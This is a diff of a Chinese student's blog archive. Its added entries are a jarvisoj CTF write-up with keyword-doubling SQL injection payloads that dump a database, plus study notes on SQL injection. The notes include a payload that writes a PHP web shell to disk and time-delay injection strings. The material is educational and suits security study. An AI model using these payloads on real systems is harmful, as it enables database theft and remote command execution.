+<p>data:,&lt;文本数据&gt;<br>data:text/plain,&lt;文本数据&gt;<br>data:text/html,&lt;HTML代码&gt;<br>data:text/html;base64,&lt;base64编码的HTML代码&gt;<br>data:text/css,&lt;CSS代码&gt;<br>data:text/css;base64,&lt;base64编码的CSS代码&gt;<br>data:text/javascript,&lt;Javascript代码&gt;<br>data:text/javascript;base64,&lt;base64编码的Javascript代码&gt;<br>data:image/gif;base64,base64编码的gif图片数据<br>data:image/png;base64,base64编码的png图片数据<br>data:image/jpeg;base64,base64编码的jpeg图片数据<br>data:image/x-icon;base64,base64编码的icon图片数据</p>
+</blockquote>
+<p>输入?id=0e&amp;a=data:,1112 is a nice lab!&amp;b=%00411111,返回</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200618170326089.png"  alt="image-20200618170326089"></p>
+<p> {/^HT2mCpcvOLf} 不像flag，像一个目录，于是，尝试在地址栏输入：<code>http://web.jarvisoj.com:32780/^HT2mCpcvOLf</code></p>
+<p>返回<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200618170422676.png"  alt="image-20200618170422676"></p>
+<p>发现跳转后自动补id=1，考虑sql注入</p>
+<p>尝试id=1 or 1=1</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200618170552202.png"  alt="image-20200618170552202"></p>
+<p>怀疑空格有问题，用/<em>\</em>/代替</p>
+<p>还是不行，可能过滤了**,改为/*1*/,显示正常<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200618170904600.png"  alt="image-20200618170904600"></p>
+<p>and 1=1也没问题，and 1=2报错</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200618170958621.png"  alt="image-20200618170958621"></p>
+<p>输入id=1/*1*/order/*1*/by/*1*/3显示正常，但是4报错，说明有三个字段</p>
+<p>下面开始爆数据库：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;-1&#x2F;*12*&#x2F;uniunionon&#x2F;*12*&#x2F;seselectlect&#x2F;*12*&#x2F;1,2,(database())%23</span><br></pre></td></tr></table></figure>
+<p>得到数据库名test</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200618193932873.png"  alt="image-20200618193932873"></p>
+<p>接下来开始爆表名：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;-1&#x2F;*12*&#x2F;uniunionon&#x2F;*12*&#x2F;seselectlect&#x2F;*12*&#x2F;1,2,(seselectlect&#x2F;*12*&#x2F;group_concat(table_name)&#x2F;*12*&#x2F;frfromom&#x2F;*12*&#x2F;information_schema.tables&#x2F;*12*&#x2F;where&#x2F;*12*&#x2F;table_schema&#x3D;database())%23</span><br></pre></td></tr></table></figure>
+
+
+<p>得到表名：content</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200618193952200.png"  alt="image-20200618193952200"></p>
+<p>接下来爆列名：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;-1&#x2F;*12*&#x2F;uniunionon&#x2F;*12*&#x2F;seselectlect&#x2F;*12*&#x2F;1,2,(selselectect&#x2F;*12*&#x2F;group_concat(column_name)&#x2F;*12*&#x2F;frofromm&#x2F;*12*&#x2F;information_schema.columns&#x2F;*12*&#x2F;where&#x2F;*12*&#x2F;table_name&#x3D;0x636f6e74656e74)%23</span><br></pre></td></tr></table></figure>
+
+<p>得到列名：context</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200618194018181.png"  alt="image-20200618194018181"></p>
+<p>读取内容：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;-1&#x2F;*12*&#x2F;uniunionon&#x2F;*12*&#x2F;seselectlect&#x2F;*12*&#x2F;1,2,(selselectect&#x2F;*12*&#x2F;context&#x2F;*12*&#x2F;frofromm&#x2F;*1*&#x2F;content)%23</span><br></pre></td></tr></table></figure>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200618194057752.png"  alt="image-20200618194057752"></p>
+<h1 id="RE"><a href="#RE" class="headerlink" title="RE?"></a>RE?</h1><p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200620145708388.png"  alt="image-20200620145708388"></p>
+<p>连接：<a href="https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172" target="_blank" rel="noopener">https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172</a></p>
+<p>参考题解：<a href="https://www.jianshu.com/p/e4d61c50cb67?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation" target="_blank" rel="noopener">https://www.jianshu.com/p/e4d61c50cb67?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation</a></p>
+<p>udf.so是linux上的mysql函数</p>
+<p>先在阿里云上拉一个docker</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker pull mysql</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -p 3306:3306 --name ctf-mysql -v D:\security\docker:&#x2F;tmp  -e LANG&#x3D;C.UTF-8 -e MYSQL_ROOT_PASSWORD&#x3D;123456 -d  mysql</span><br></pre></td></tr></table></figure>
+
+<p>根据题解运行没有成功，先放下回来再说。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title> sql注入攻击与防御</title>
+    <url>/2020/06/15/sqli/sql%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="第二章知识点回忆"><a href="#第二章知识点回忆" class="headerlink" title="第二章知识点回忆"></a>第二章知识点回忆</h1><ul>
+<li><p>利用having ‘1’=’1 列举列名xxx， group by xxx having ‘1’=’1列举下一个列名</p>
+<ul>
+<li><a href="http://xxxxxxxxx?id=xxx&#39;" target="_blank" rel="noopener">http://xxxxxxxxx?id=xxx&#39;</a> group by xxx having ‘1’=’1</li>
+</ul>
+</li>
+<li><p><a href="http://xxxxxxxxx?id=xxx" target="_blank" rel="noopener">http://xxxxxxxxx?id=xxx</a>; select * from users having 1=1;–</p>
+</li>
+<li><p>0/xxx 列举表中的数值</p>
+</li>
+<li><p><a href="http://xxxxxxxxx?id=xxx&#39;" target="_blank" rel="noopener">http://xxxxxxxxx?id=xxx&#39;</a> and 1=0/name;– </p>
+</li>
+<li><p>通过注入单引号后页面返回的错误判断数据库类型，mysql？oracle？等（书P33）</p>
+</li>
+<li><p>输入user’ or 1=1返回所有页面，and 1=1返回单个商品</p>
+</li>
+<li><p>判断?id=3-1是否与?id=2返回相同的页面，如果相同。则可以直接进行减法运算</p>
+<ul>
+<li>加法也课尝试，但是+是URI保留字，可以用%2B代替</li>
+</ul>
+</li>
+<li><p>区分数值型注入和字符串型注入（有无单引号）</p>
+</li>
+<li><p>所有的数据库都可以使用”–“进行单行注释，”/**/“进行多行注释，其中mysql还可以用#进行单行注释</p>
+</li>
+<li><p>若空格被过滤，则可以使用没有内容的多行注释来避免使用空格</p>
+<ul>
+<li>?uid=45/**/or/**/1=1</li>
+</ul>
+</li>
+<li><p>输入?uid=45/*hello yes*/,若返回内容与uid=45相同，则说明注释成功，可能存在sql注入</p>
+</li>
+<li><p>?s=test’; select ‘&lt;php echo shell_exec($_GET[“cmd”]);?&gt;’ into outfile ‘/var/www/victim.com/shell.php’;–</p>
+<ul>
+<li>检索名为cmd的GET参数的值在一个操作系统shell中加以执行，并写入文件中</li>
+</ul>
+</li>
+<li><p>时间延迟</p>
+<table>
+<thead>
+<tr>
+<th>服务器种类</th>
+<th>语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>sql server</td>
+<td>?uid=45; waitfor delay ‘hours:minutes:seconds’</td>
+</tr>
+<tr>
+<td>mysql</td>
+<td>?uid=45; select benchmark(100000,encode(‘hello’,’mom))</td>
+</tr>
+<tr>
+<td>oracle pl/sql</td>
+<td>?uid=45 or 1=dbms_pipe.receive_message（‘RDS’,10)</td>
+</tr>
+<tr>
+<td>postgresql(&gt;=8.2)</td>
+<td>select pf_sleep(10);–</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<h1 id="第三章-复查代码中的SQL注入"><a href="#第三章-复查代码中的SQL注入" class="headerlink" title="第三章 复查代码中的SQL注入"></a>第三章 复查代码中的SQL注入</h1><p> 造成sql注入的原因是没有对输入进行检查</p>
+<p>手动检查代码（静态）可以利用grep命令检查是否直接使用了没有检查过的输入参数，可以配合grep命令进行筛查，注意不同数据库有不同的处理函数</p>
+<p>（具体指令在书上做了标记，内容比较多，就不抄过来了）</p>
+<p>也可以使用一些工具搭配owasp进行练习</p>
+<h1 id="第四章-利用SQL注入"><a href="#第四章-利用SQL注入" class="headerlink" title="第四章 利用SQL注入"></a>第四章 利用SQL注入</h1><ul>
+<li>堆叠查询：执行多条sql语句</li>
+<li>非盲跟踪：利用报错信息判断是什么数据库</li>
+<li>P116，获取version信息<ul>
+<li>id=@@version</li>
+<li>name=’%2B@@version%2B’</li>
+</ul>
+</li>
+<li>查看字符串的衔接方式，判断数据库种类</li>
+<li>利用数字函数判断数据库种类</li>
+<li>UNION判断列<ul>
+<li>id=12+union+select+null – 利用null的个数判断列</li>
+</ul>
+</li>
+<li>order by 判断列数（效率更高）二分查找</li>
+<li>匹配数据类型<ul>
+<li>id=12+union+select+’test’,null,null,null</li>
+</ul>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>sqli</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>sqli</tag>
       </tags>
   </entry>
   <entry>
@@ -520,9 +1085,11 @@
 <p>大致过了一下漏测课上讲的http内容</p>
 <p>这周一直在忙数学作业和国创项目答辩，学的不是很多，周末补上</p>
 <p>2020/6/12</p>
-<p>php看完了函数，但是php匿名函数和闭包还需要再看看</p>
-<p>漏测课做了反序列化攻击、sql注入、跨站脚本攻击实验，并写了实验报告</p>
-<p>数据库课程完成了大作业，flask+mysql数据库管理系统</p>
+<p>php看完了函数，php匿名函数和闭包还需要再看看</p>
+<p>漏洞利用与渗透测试课做了反序列化攻击、sql注入、跨站脚本攻击实验，并写了实验报告<br>这个学期的课程都上完了，总结了以下漏测课这个学期做的实验<a href="https://michelle19l.gitee.io/categories/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A/" target="_blank" rel="noopener">https://michelle19l.gitee.io/categories/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A/</a><br>数据库课程完成了大作业，flask+mysql数据库管理系统</p>
+<p>2020/6/19</p>
+<p>本周看了sql注入的前两章，现在正在看第三章</p>
+<p>对着题解写了五个jarvisoj的web题，总结了解题过程和知识点</p>
 ]]></content>
   </entry>
   <entry>
@@ -600,8 +1167,8 @@
         <category>漏洞测试作业</category>
       </categories>
       <tags>
-        <tag>漏洞测试</tag>
         <tag>web</tag>
+        <tag>漏洞测试</tag>
         <tag>php</tag>
       </tags>
   </entry>
@@ -1648,7 +2215,7 @@
   </entry>
   <entry>
     <title>sql语言</title>
-    <url>/2020/05/21/sql/</url>
+    <url>/2020/05/21/%E6%95%B0%E6%8D%AE%E5%BA%93/sql/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><ul>
 <li>创建数据库</li>
 <li>插入数据存储过程代码</li>
@@ -3572,7 +4139,7 @@
 <blockquote>
 <p>#南开大学闭馆音乐</p>
 
-    <div id="aplayer-dyJQbPFN" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="2999255636" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#FF4081"></div>
+    <div id="aplayer-KRqnPsNo" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="2999255636" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#FF4081"></div>
 </blockquote>
 <blockquote>
 <p>参考：</p>
@@ -3762,7 +4329,7 @@
   </entry>
   <entry>
     <title>数据库上机L5</title>
-    <url>/2020/04/10/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8A%E6%9C%BAL5/</url>
+    <url>/2020/04/10/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8A%E6%9C%BAL5/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="优化查询速度——数据库索引"><a href="#优化查询速度——数据库索引" class="headerlink" title="优化查询速度——数据库索引"></a>优化查询速度——数据库索引</h1><ul>
 <li>数据库索引<ul>
 <li>B/B+树 -&gt; 范围检索</li>
@@ -3773,7 +4340,7 @@
 </ul>
 ]]></content>
       <categories>
-        <category>major</category>
+        <category>数据库</category>
       </categories>
       <tags>
         <tag>数据库</tag>
@@ -4140,13 +4707,13 @@ ADD FOREIGN KEY (c) REFERENCES  F(c);</code></pre></li>
   </entry>
   <entry>
     <title>数据库上机L4</title>
-    <url>/2020/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8A%E6%9C%BAL4/</url>
+    <url>/2020/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8A%E6%9C%BAL4/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><ul>
 <li>空值再检索操作存储等方面都有不好的影响</li>
 </ul>
 ]]></content>
       <categories>
-        <category>major</category>
+        <category>数据库</category>
       </categories>
       <tags>
         <tag>数据库</tag>
@@ -4207,7 +4774,7 @@ ADD FOREIGN KEY (c) REFERENCES  F(c);</code></pre></li>
   </entry>
   <entry>
     <title>数据库上机L3</title>
-    <url>/2020/03/26/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8A%E6%9C%BAL3/</url>
+    <url>/2020/03/26/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8A%E6%9C%BAL3/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><ol>
 <li>数值类型：满足要求下，尽量使用“短”数据类型</li>
 <li>字符串类型：char、varchar，字符与字节数的关系</li>
@@ -4278,7 +4845,7 @@ ADD FOREIGN KEY (c) REFERENCES  F(c);</code></pre></li>
 </ul>
 ]]></content>
       <categories>
-        <category>major</category>
+        <category>数据库</category>
       </categories>
       <tags>
         <tag>数据库</tag>
@@ -5567,7 +6134,7 @@ ADD FOREIGN KEY (c) REFERENCES  F(c);</code></pre></li>
   </entry>
   <entry>
     <title>数据库上机L2</title>
-    <url>/2020/03/16/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8A%E6%9C%BAL2%EF%BC%9A%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E4%BB%A3%E7%A0%81/</url>
+    <url>/2020/03/16/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8A%E6%9C%BAL2%EF%BC%9A%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E4%BB%A3%E7%A0%81/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><ul>
 <li>创建数据库</li>
 <li>插入数据存储过程代码</li>
@@ -5580,6 +6147,9 @@ ADD FOREIGN KEY (c) REFERENCES  F(c);</code></pre></li>
 <p>运行之后需要刷新</p>
 <p><img src="/img/loading.gif" class="lazyload" data-src="/images/image-20200316214043980.png"  alt="image-20200316214043980" style="zoom:50%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/1584365805(1).png"  alt="1584365805(1).png" style="zoom:35%;"></p>
 ]]></content>
+      <categories>
+        <category>数据库</category>
+      </categories>
       <tags>
         <tag>数据库</tag>
       </tags>
@@ -5843,100 +6413,6 @@ ADD FOREIGN KEY (c) REFERENCES  F(c);</code></pre></li>
 ]]></content>
   </entry>
   <entry>
-    <title>Qt作业二：画图板</title>
-    <url>/2019/08/31/Qt%E4%BD%9C%E4%B8%9A%E4%BA%8C%E2%80%94%E2%80%94%E7%94%BB%E5%9B%BE%E6%9D%BF/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="一、界面设计"><a href="#一、界面设计" class="headerlink" title="一、界面设计"></a>一、界面设计</h3><p>利用designer设计menubar和toolbar<br>遇到的问题和解决方法：<br>toolbar和menubar重叠，拖动toolbar部件至屏幕右侧即可。<br><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/d8i77lp27ad7u5mdfth4ivte/image_1df8880jt10m8g53v041efd6j29.png"  alt="image_1df8880jt10m8g53v041efd6j29.png-246.9kB"><br>menubar中可以添加子选项<br><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/mbukua86v9pv56obgta3og2o/image_1df88esf0le118bvdh91a0b130d9.png"  alt="image_1df88esf0le118bvdh91a0b130d9.png-256.2kB"></p>
-<hr>
-<h3 id="二、paint类属性"><a href="#二、paint类属性" class="headerlink" title="二、paint类属性"></a>二、paint类属性</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QPixmap *pix;&#x2F;&#x2F;设置画图背景</span><br><span class="line">QPoint start;&#x2F;&#x2F;鼠标按下时的坐标</span><br><span class="line">QPoint end;&#x2F;&#x2F;鼠标抬起时的坐标</span><br><span class="line">int status;&#x2F;&#x2F;画图状态，1：直线，2：矩形，3：椭圆，4：自由绘图</span><br><span class="line">QPen pen;&#x2F;&#x2F;设置线条的属性</span><br><span class="line">QBrush brush;&#x2F;&#x2F;设置填充属性</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="三、paint类protected成员"><a href="#三、paint类protected成员" class="headerlink" title="三、paint类protected成员"></a>三、paint类protected成员</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protected:</span><br><span class="line">    void mousePressEvent(QMouseEvent *event);&#x2F;&#x2F;鼠标按下事件</span><br><span class="line">    void mouseMoveEvent(QMouseEvent *event);&#x2F;&#x2F;鼠标移动事件</span><br><span class="line">    void mouseReleaseEvent(QMouseEvent *);&#x2F;&#x2F;鼠标释放事件</span><br><span class="line">    void paintEvent(QPaintEvent*);&#x2F;&#x2F;绘画事件</span><br></pre></td></tr></table></figure>
-<p>函数定义：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void paint::mousePressEvent(QMouseEvent *event)</span><br><span class="line">&#123;</span><br><span class="line">    start&#x3D;event-&gt;pos();&#x2F;&#x2F;获得鼠标点击坐标</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">void paint::mouseReleaseEvent(QMouseEvent *event)</span><br><span class="line">&#123;</span><br><span class="line">    end&#x3D;event-&gt;pos();</span><br><span class="line">    qDebug()&lt;&lt;start&lt;&lt;endl&lt;&lt;end&lt;&lt;endl;</span><br><span class="line">    QPainter *painter&#x3D;new QPainter(pix);</span><br><span class="line">    painter-&gt;setPen(pen);&#x2F;&#x2F;设置线条属性</span><br><span class="line">    painter-&gt;setBrush(brush);&#x2F;&#x2F;设置笔刷属性</span><br><span class="line">    switch (status) &#123;</span><br><span class="line">    case 1:&#x2F;&#x2F;画直线</span><br><span class="line">    &#123;</span><br><span class="line">        painter-&gt;drawLine(start,end);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    case 2:&#x2F;&#x2F;画矩形</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        int width&#x3D;end.x()-start.x();</span><br><span class="line">        int height&#x3D;end.y()-start.x();</span><br><span class="line">        painter-&gt;drawRect(start.x(),start.y(),width,height);</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    case 3:&#x2F;&#x2F;画椭圆</span><br><span class="line">    &#123;</span><br><span class="line">        int width&#x3D;end.x()-start.x();</span><br><span class="line">        int height&#x3D;end.y()-start.x();</span><br><span class="line">        painter-&gt;drawEllipse(start.x(),start.y(),width,height);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    this-&gt;update();</span><br><span class="line">    delete painter;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">void paint::paintEvent(QPaintEvent *)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  QPainter painter(this);</span><br><span class="line">  painter.drawPixmap(QPoint(0, 0), *pix);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">void paint:: mouseMoveEvent(QMouseEvent *event)</span><br><span class="line">&#123;</span><br><span class="line">    if(status&#x3D;&#x3D;4)&#x2F;&#x2F;绘制鼠标移动轨迹</span><br><span class="line">    &#123;</span><br><span class="line">        QPainter* painter&#x3D;new QPainter(pix);</span><br><span class="line">        end&#x3D;event-&gt;pos();</span><br><span class="line">        painter-&gt;setPen(pen);</span><br><span class="line">        painter-&gt;drawLine(start,end);&#x2F;&#x2F;每一次移动画直线</span><br><span class="line">        this-&gt;update();</span><br><span class="line">        start&#x3D;end;&#x2F;&#x2F;下一次绘制的开始点是这次的结束点</span><br><span class="line">        delete painter;&#x2F;&#x2F;若无delete则只可以绘制一次</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="遇到的问题和解决方法："><a href="#遇到的问题和解决方法：" class="headerlink" title="遇到的问题和解决方法："></a>遇到的问题和解决方法：</h4><p>painter在完成每次绘制时需delete，否则无法进行下一次绘制</p>
-<hr>
-<h3 id="四、构造函数"><a href="#四、构造函数" class="headerlink" title="四、构造函数"></a>四、构造函数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">paint::paint(QWidget *parent) :</span><br><span class="line">    QMainWindow(parent),</span><br><span class="line">    ui(new Ui::paint)</span><br><span class="line">&#123;</span><br><span class="line">    ui-&gt;setupUi(this);</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;设置画布</span><br><span class="line">    pix&#x3D;new QPixmap(this-&gt;size()*5);</span><br><span class="line">    pix-&gt;fill(Qt::white);</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;设置初使属性</span><br><span class="line">    brush.setColor(Qt::NoBrush);</span><br><span class="line">    status&#x3D;1;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;连接信号和槽</span><br><span class="line">    connect(ui-&gt;line,SIGNAL(triggered(bool)),this,SLOT(status_line()));</span><br><span class="line">    connect(ui-&gt;rect,SIGNAL(triggered(bool)),this,SLOT(status_rect()));</span><br><span class="line">    connect(ui-&gt;ellipse,SIGNAL(triggered(bool)),this,SLOT(status_ellipse()));</span><br><span class="line">    connect(ui-&gt;actionfree,SIGNAL(triggered(bool)),this,SLOT(status_free()));</span><br><span class="line">    connect(ui-&gt;actionred,SIGNAL(triggered(bool)),this,SLOT(change_color_red()));</span><br><span class="line">    connect(ui-&gt;actionblue,SIGNAL(triggered(bool)),this,SLOT(change_color_blue()));</span><br><span class="line">    connect(ui-&gt;actiongreen,SIGNAL(triggered(bool)),this,SLOT(change_color_green()));</span><br><span class="line">    connect(ui-&gt;actionblack,SIGNAL(triggered(bool)),this,SLOT(change_color_black()));</span><br><span class="line">    connect(ui-&gt;action2,SIGNAL(triggered(bool)),this,SLOT(penwidth2()));</span><br><span class="line">    connect(ui-&gt;action5,SIGNAL(triggered(bool)),this,SLOT(penwidth5()));</span><br><span class="line">    connect(ui-&gt;action8,SIGNAL(triggered(bool)),this,SLOT(penwidth8()));</span><br><span class="line">    connect(ui-&gt;action10,SIGNAL(triggered(bool)),this,SLOT(penwidth10()));</span><br><span class="line">    connect(ui-&gt;solid_line,SIGNAL(triggered(bool)),this,SLOT(set_solid()));</span><br><span class="line">    connect(ui-&gt;dash_line,SIGNAL(triggered(bool)),this,SLOT(set_dash()));</span><br><span class="line">    connect(ui-&gt;dash_dot,SIGNAL(triggered(bool)),this,SLOT(set_dashdot()));</span><br><span class="line">    connect(ui-&gt;dash_dot_dot,SIGNAL(triggered(bool)),this,SLOT(set_dashdotdot()));</span><br><span class="line">    connect(ui-&gt;dot_line,SIGNAL(triggered(bool)),this,SLOT(set_dot()));</span><br><span class="line">    connect(ui-&gt;fred,SIGNAL(triggered(bool)),this,SLOT(set_fill_red()));</span><br><span class="line">    connect(ui-&gt;fblue,SIGNAL(triggered(bool)),this,SLOT(set_fill_blue()));</span><br><span class="line">    connect(ui-&gt;fblack,SIGNAL(triggered(bool)),this,SLOT(set_fill_black()));</span><br><span class="line">    connect(ui-&gt;fgreen,SIGNAL(triggered(bool)),this,SLOT(set_fill_green()));</span><br><span class="line">    connect(ui-&gt;solid_pattern,SIGNAL(triggered(bool)),this,SLOT(set_solid_pattern()));</span><br><span class="line">    connect(ui-&gt;dense_pattern,SIGNAL(triggered(bool)),this,SLOT(set_dense_pattern()));</span><br><span class="line">    connect(ui-&gt;none,SIGNAL(triggered(bool)),this,SLOT(set_none_pattern()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="遇到的问题和解决方法：-1"><a href="#遇到的问题和解决方法：-1" class="headerlink" title="遇到的问题和解决方法："></a>遇到的问题和解决方法：</h4><ul>
-<li>可以获得鼠标事件坐标，但无法绘制，解决方法：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pix&#x3D;new QPixmap(this-&gt;size()*5);&#x2F;&#x2F;结构函数</span><br><span class="line">QPainter *painter&#x3D;new QPainter(pix);&#x2F;&#x2F;绘制函数</span><br></pre></td></tr></table></figure></li>
-<li>点击menubar中label发出的信号槽函数无法接收到：<br>原connect写法：<br><code>connect(ui-&gt;line,SIGNAL(clicked()),this,SLOT(status_line()));</code><br>将<code>clicked()</code>改为<code>triggered(bool)</code>即可</li>
-</ul>
-<hr>
-<h3 id="五、槽函数："><a href="#五、槽函数：" class="headerlink" title="五、槽函数："></a>五、槽函数：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public slots:</span><br><span class="line">    &#x2F;&#x2F;设置绘制形状</span><br><span class="line">    void status_line();</span><br><span class="line">    void status_rect();</span><br><span class="line">    void status_ellipse();</span><br><span class="line">    void status_free();&#x2F;&#x2F;绘制鼠标轨迹</span><br><span class="line">    &#x2F;&#x2F;设置线条颜色</span><br><span class="line">    void change_color_blue();</span><br><span class="line">    void change_color_red();</span><br><span class="line">    void change_color_green();</span><br><span class="line">    void change_color_black();</span><br><span class="line">    &#x2F;&#x2F;设置线条宽度</span><br><span class="line">    void penwidth2();</span><br><span class="line">    void penwidth5();</span><br><span class="line">    void penwidth8();</span><br><span class="line">    void penwidth10();</span><br><span class="line">    &#x2F;&#x2F;设置线条样式</span><br><span class="line">    void set_solid();</span><br><span class="line">    void set_dash();</span><br><span class="line">    void set_dot();</span><br><span class="line">    void set_dashdot();</span><br><span class="line">    void set_dashdotdot();</span><br><span class="line">    &#x2F;&#x2F;设置填充颜色</span><br><span class="line">    void set_fill_red();</span><br><span class="line">    void set_fill_blue();</span><br><span class="line">    void set_fill_green();</span><br><span class="line">    void set_fill_black();</span><br><span class="line">    &#x2F;&#x2F;设置填充样式</span><br><span 